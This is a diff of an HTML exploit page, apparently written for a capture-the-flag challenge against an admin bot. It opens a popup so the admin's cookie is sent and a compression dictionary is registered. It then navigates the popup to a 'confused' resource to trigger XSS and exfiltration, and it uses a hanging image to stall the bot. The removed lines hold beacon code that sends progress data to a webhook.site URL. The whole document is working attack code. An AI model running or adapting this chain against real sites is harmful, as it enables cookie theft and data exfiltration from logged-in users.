@@ -1,23 +1,16 @@
 <!doctype html>
 <html><head><meta charset="utf-8"><title>a</title></head>
 <body><h1>loading</h1>
-<!-- hanging resource: keeps main page from reaching networkidle0 so the bot's
-     goto() waits the full ~10s, giving the popup time to register+confuse+exfil -->
+<!-- hanging resource keeps the page from reaching networkidle0 so the bot's goto()
+     waits ~10s, giving the popup time to register the dict, confuse, and exfil. -->
 <img src="http://10.255.255.1/keepalive" style="display:none">
 <script>
 const q = new URLSearchParams(location.search);
 const B = (q.get('b') || 'http://backend:8080').replace(/\/+$/,'');
 const P = '2';
-const WH='https://webhook.site/8033ef72-6b18-4fa8-a2f8-8a910a772789/S?';
-function bx(s){ new Image().src=WH+s+'&t='+Date.now(); }
-bx('step=loaded&B='+encodeURIComponent(B));
-var w;
-try { w=window.open(B+'/api/content/'+P+'/1','x'); bx('step=opened&ok='+(w?1:0)); }
-catch(e){ bx('step=openerr&e='+encodeURIComponent(''+e)); }
-setTimeout(function(){
-  bx('step=confuse');
-  try { w.location=B+'/api/content/'+P+'/2'; bx('step=navdone'); }
-  catch(e){ bx('step=naverr&e='+encodeURIComponent(''+e)); }
-}, 3000);
+// 1) register RB dictionary via top-level popup nav (SameSite=Lax => admin cookie sent)
+const w = window.open(B + '/api/content/' + P + '/1', 'x');
+// 2) after registration, navigate popup to the confused version -> dcz XSS -> exfil
+setTimeout(function(){ try { w.location = B + '/api/content/' + P + '/2'; } catch (e) {} }, 3000);
 </script>
 </body></html>
